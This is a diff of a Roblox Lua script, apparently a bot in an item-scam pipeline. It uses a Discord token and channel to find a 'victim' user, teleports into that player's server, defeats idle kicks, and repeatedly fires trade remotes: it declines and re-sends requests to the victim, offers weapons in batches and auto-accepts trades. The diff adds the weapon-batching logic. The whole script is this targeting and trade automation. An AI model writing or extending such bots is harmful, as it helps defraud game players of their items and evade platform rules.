@@ -1,5 +1,5 @@
 if not game:IsLoaded() then
-	game.Loaded:Wait()
+    game.Loaded:Wait()
 end
 
 if token == "" or channelId == "" then
@@ -7,7 +7,7 @@ if token == "" or channelId == "" then
 end
 
 local bb = game:GetService("VirtualUser")
-game:service "Players".LocalPlayer.Idled:Connect(function()
+game:service("Players").LocalPlayer.Idled:Connect(function()
     bb:CaptureController()
     bb:ClickButton2(Vector2.new())
 end)
@@ -26,6 +26,14 @@ local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
 local didVictimLeave = false
 local timer = 0
+local weaponsToSend = {} -- Table to store all weapons to trade
+local untradedItems = {} -- Weapons left to trade
+
+-- Function to populate weaponsToSend (add your weapon selection logic here)
+local function getWeaponsToTrade()
+    -- Your weapon selection logic goes here
+    -- Example: weaponsToSend = { {DataID = "Corrupt", Amount = 1}, {DataID = "Batwing", Amount = 1} }
+end
 
 local function selectDevice()
     while task.wait(0.1) do
@@ -46,34 +54,58 @@ end
 
 task.spawn(selectDevice)
 
-
 local waittime = delay or 2
 wait(waittime)
 
 wait(4)
 game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Hai!')
 
-local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
-
 local function saveJoinedId(messageId)
     table.insert(joinedIds, messageId)
     writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
+local function addWeaponToTrade(id)
+    local args = {
+        [1] = id,
+        [2] = "Weapons"
+    }
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+end
+
 local function acceptRequest()
     while task.wait(0.1) do
-    
-    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
-        local args = {
-        [1] = game:GetService("Players"):WaitForChild(victimUser)
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+        if #untradedItems > 0 or #weaponsToSend > 0 then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+            local args = {
+                [1] = game:GetService("Players"):WaitForChild(victimUser)
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+        end
     end
 end
 
 local function acceptTrade()
     while task.wait(0.1) do
-        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
+        if IsTrading() then
+            -- If untradedItems is empty but weaponsToSend has items, move them to untradedItems
+            if #untradedItems == 0 and #weaponsToSend > 0 then
+                untradedItems = table.clone(weaponsToSend)
+                weaponsToSend = {}
+            end
+            
+            -- Trade up to 4 items at a time
+            for i = 1, math.min(4, #untradedItems) do
+                local weapon = table.remove(untradedItems, 1)
+                for count = 1, weapon.Amount do
+                    addWeaponToTrade(weapon.DataID)
+                end
+            end
+            
+            wait(6)
+            game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(285646582)
+            wait(1) -- Small delay before next trade
+        end
     end
 end
 
@@ -85,6 +117,8 @@ local function waitForPlayerLeave()
                 playerRemovedConnection:Disconnect()
             end
             didVictimLeave = true
+            weaponsToSend = {}
+            untradedItems = {}
         end
     end)
 end
@@ -103,6 +137,10 @@ local function tradeTimer()
         end
     end
 end
+
+-- Initialize weapons to trade
+getWeaponsToTrade()
+untradedItems = table.clone(weaponsToSend)
 
 waitForPlayerLeave()
 task.spawn(acceptTrade)
@@ -137,6 +175,10 @@ local function autoJoin()
                             if not table.find(joinedIds, tostring(message.id)) then
                                 saveJoinedId(tostring(message.id))
                                 writefile("user.txt", victimUsername)
+                                weaponsToSend = {}
+                                untradedItems = {}
+                                getWeaponsToTrade()
+                                untradedItems = table.clone(weaponsToSend)
                                 game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
                                 return
                             end
